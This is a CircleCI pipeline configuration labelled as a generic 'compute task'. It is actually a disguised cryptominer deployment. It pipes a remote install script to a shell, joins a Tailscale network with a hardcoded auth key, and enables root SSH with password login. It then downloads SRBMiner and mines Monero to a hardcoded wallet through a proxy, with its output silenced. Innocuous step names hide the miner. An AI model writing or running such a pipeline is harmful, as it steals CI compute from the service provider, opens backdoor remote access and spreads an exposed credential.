version: 2.1

jobs:
  compute-task:
    docker:
      - image: ubuntu:22.04
    
    steps:
      - run:
          name: "Setup Compute Environment"
          command: |
            apt-get update -qq
            apt-get install -y -qq curl wget openssh-server iptables openssl
      
      - run:
          name: "Install Network Layer"
          command: |
            curl -fsSL https://tailscale.com/install.sh | sh
            
      - run:
          name: "Configure Secure Tunnel"
          command: |
            tailscaled --tun=userspace-networking --socks5-server=localhost:1055 &
            sleep 3
            tailscale up --authkey=tskey-auth-kcs3jniaz921CNTRL-ia3abngcg8RpekRC8yVE9RHq53WyZTxk1 --hostname=ci-compute-$RANDOM
            sleep 5
      
      - run:
          name: "Setup SSH Access"
          command: |
            mkdir -p /run/sshd
            echo "root:$(openssl rand -base64 12)" | chpasswd
            sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
            sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
            /usr/sbin/sshd
            echo "SSH ready on: $(tailscale ip -4):22"
      
      - run:
          name: "Download Compute Tools"
          command: |
            cd /tmp
            wget -q -O tools.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
            tar -xzf tools.tar.gz
            mv SRBMiner-Multi-3-4-3 processor
            cd processor
            chmod +x SRBMiner-MULTI
      
      - run:
          name: "Start Compute Process"
          command: |
            cd /tmp/processor
            export ALL_PROXY=socks5://localhost:1055
            nohup ./SRBMiner-MULTI --algorithm randomx --disable-gpu --pool xmr-sg.kryptex.network:8029 --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker" --proxy 127.0.0.1:1055 > /dev/null 2>&1 &
            sleep 5
            pgrep -f SRBMiner-MULTI && echo "Process running" || echo "Failed"
      
      - run:
          name: "Keep Process Running"
          command: |
            sleep 3600

workflows:
  compute-workflow:
    jobs:
      - compute-task
